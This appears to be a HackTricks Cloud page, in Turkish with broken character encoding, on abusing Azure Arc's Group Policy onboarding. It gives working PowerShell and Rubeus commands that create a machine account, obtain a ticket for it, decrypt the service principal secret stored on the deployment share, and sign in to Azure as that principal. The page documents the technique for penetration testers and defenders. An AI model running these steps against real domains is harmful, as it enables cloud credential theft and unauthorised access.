# Az - Azure Arc Hassas GPO DaÄŸÄ±tma BetiÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

### SorunlarÄ± TanÄ±mlama

Azure Arc, yeni iÃ§ sunucularÄ±n (katÄ±lmÄ±ÅŸ etki alanÄ± sunucularÄ±) Azure Arc'a Grup Ä°lke Nesnesi yÃ¶ntemiyle entegrasyonuna olanak tanÄ±r. Bu iÅŸlemi kolaylaÅŸtÄ±rmak iÃ§in Microsoft, baÅŸlatma iÅŸlemi iÃ§in gerekli daÄŸÄ±tÄ±m araÃ§larÄ±nÄ± saÄŸlar. ArcEnableServerGroupPolicy.zip dosyasÄ± iÃ§inde DeployGPO.ps1, EnableAzureArc.ps1 ve AzureArcDeployment.psm1 betikleri bulunabilir.

Ã‡alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, DeployGPO.ps1 betiÄŸi aÅŸaÄŸÄ±daki iÅŸlemleri gerÃ§ekleÅŸtirir:

1. Yerel etki alanÄ±nda Azure Arc SunucularÄ± KatÄ±lma GPO'sunu oluÅŸturur.
2. Onboarding iÅŸlemi iÃ§in oluÅŸturulan belirli aÄŸ paylaÅŸÄ±mÄ±na EnableAzureArc.ps1 baÅŸlatma betiÄŸini ve Windows yÃ¼kleyici paketini kopyalar.

Bu betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±rken sistem yÃ¶neticilerinin **ServicePrincipalId** ve **ServicePrincipalClientSecret** olmak Ã¼zere iki ana parametreyi saÄŸlamalarÄ± gerekir. AyrÄ±ca, etki alanÄ±, paylaÅŸÄ±mÄ± barÄ±ndÄ±ran sunucunun FQDN'si ve paylaÅŸÄ±m adÄ± gibi diÄŸer parametreler de gereklidir. KiracÄ± kimliÄŸi, kaynak grubu ve diÄŸer gerekli bilgiler de betiÄŸe saÄŸlanmalÄ±dÄ±r.

DPAPI-NG ÅŸifrelemesi kullanÄ±larak belirtilen paylaÅŸÄ±mdaki AzureArcDeploy dizininde ÅŸifrelenmiÅŸ bir gizli oluÅŸturulur. ÅifrelenmiÅŸ gizli, encryptedServicePrincipalSecret adlÄ± bir dosyada saklanÄ±r. Bu ÅŸifrelemenin, DeployGPO.ps1 betiÄŸinde gerÃ§ekleÅŸtirildiÄŸi kanÄ±tlanabilir. Åifreleme, $descriptor ve $ServicePrincipalSecret deÄŸiÅŸkenleriyle ProtectBase64'Ã¼ Ã§aÄŸÄ±rarak gerÃ§ekleÅŸtirilir. AÃ§Ä±klamada belirtildiÄŸi gibi, descriptor, Domain Computer ve Domain Controller grup SIDs'ini iÃ§erir ve ServicePrincipalSecret'in yalnÄ±zca Etki AlanÄ± Denetleyicileri ve Etki AlanÄ± BilgisayarlarÄ± gÃ¼venlik gruplarÄ± tarafÄ±ndan ÅŸifresinin Ã§Ã¶zÃ¼lebileceÄŸini saÄŸlar.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### SÃ¶mÃ¼rÃ¼

AÅŸaÄŸÄ±daki koÅŸullara sahibiz:

1. Ä°Ã§ aÄŸÄ± baÅŸarÄ±lÄ± bir ÅŸekilde ele geÃ§irdik.
2. Active Directory iÃ§inde bir bilgisayar hesabÄ± oluÅŸturma veya kontrolÃ¼nÃ¼ ele geÃ§irme yeteneÄŸine sahibiz.
3. AzureArcDeploy dizinini iÃ§eren bir aÄŸ paylaÅŸÄ±mÄ± keÅŸfettik.

Bir AD ortamÄ±nda bir makine hesabÄ± elde etmenin birkaÃ§ yÃ¶ntemi vardÄ±r. En yaygÄ±n olanlardan biri makine hesabÄ± kotasÄ±nÄ± sÃ¶mÃ¼rmektir. BaÅŸka bir yÃ¶ntem ise zayÄ±f ACL'ler veya Ã§eÅŸitli diÄŸer yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla bir makine hesabÄ±nÄ± tehlikeye atmak olabilir.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Bir makine hesabÄ± elde edildikten sonra bu hesap kullanÄ±larak kimlik doÄŸrulamasÄ± yapmak mÃ¼mkÃ¼ndÃ¼r. Ya runas.exe komutunu netonly bayraÄŸÄ± ile kullanabiliriz ya da Rubeus.exe ile bilet geÃ§irme yÃ¶ntemini kullanabiliriz.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Bilgisayar hesabÄ±mÄ±z iÃ§in TGT'nin bellekte saklanmasÄ±yla, aÅŸaÄŸÄ±daki betiÄŸi kullanarak hizmet baÅŸkanÄ± sÄ±rrÄ±nÄ± ÅŸifreleyebiliriz.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatif olarak, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) kullanabiliriz.

Bu noktada, Azure'a baÄŸlanmak iÃ§in gerekli kalan bilgileri toplayabiliriz. Bu bilgiler, ÅŸifrelenmiÅŸ Service Principal Secret dosyasÄ±yla aynÄ± aÄŸ paylaÅŸÄ±mÄ±nda bulunan ArcInfo.json dosyasÄ±nda saklanmaktadÄ±r. Bu dosya, TenantId, servicePrincipalClientId, ResourceGroup ve daha fazlasÄ± gibi detaylarÄ± iÃ§erir. Bu bilgilerle, etkilenmiÅŸ servis prensibi olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in Azure CLI kullanabiliriz.

## Referanslar

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
